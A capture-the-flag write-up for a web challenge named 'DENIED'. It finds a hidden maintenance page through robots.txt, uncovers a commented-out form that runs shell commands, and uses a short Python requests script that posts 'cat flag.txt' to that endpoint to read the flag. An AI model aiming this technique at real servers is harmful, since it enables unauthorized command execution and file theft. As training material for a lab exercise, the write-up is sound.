# DENIED

## Web Security: 75 points

## Solve

Sometimes websites are afraid of the terminator finding things out. http://challenge.acictf.com:15499/ The flag is in `flag.txt`.

## Hints

* How can websites keep search engines from finding private information?
* Sometimes the developers leave some comments that give you a hint about what to do...
* You can use the `cat` command to read files

## Solution

The website hints at robots:

> You need robots? We have robots. We've got all of the robots!

Check the **/robots.txt** page to see whats there:
```
User-agent: *
Allow: /index.html
Allow: /products.html
Disallow: /maintenance_foo_bar_deadbeef_12345.html
```

The maintenance page seems interesting:
> Human-Built Robots LLC.  
Maintenance  
"Result: Run a command!" 

Inspect the page and look at the source. There is a section that is commented out:
```
<!--
Disabled for being insecure... oops!
<form action="/secret_maintenance_foo_543212345", method="POST">
    <input name="cmd"/>
</form>
-->
```
Uncomment this section to reveal an input box that can accept commands. `pwd`, `ls`, and `cat` are all valid commands for this input.

Using python's requests library, a script can post commands to **/secret_maintenance_foo** to experiment further.:

```
#!/usr/bin/python3
import requests

url = "http://challenge.acictf.com:12133"
myObj = {'cmd' : 'cat flag.txt'}
x = requests.post(url + "/secret_maintenance_foo_543212345", data = myObj)
print(x.text)
```

The `ls` command produces:
```
flag.txt
robots.txt
server.py
static
templates
xinet_startup.sh
```
The command `cat flag.txt` prints out the flag.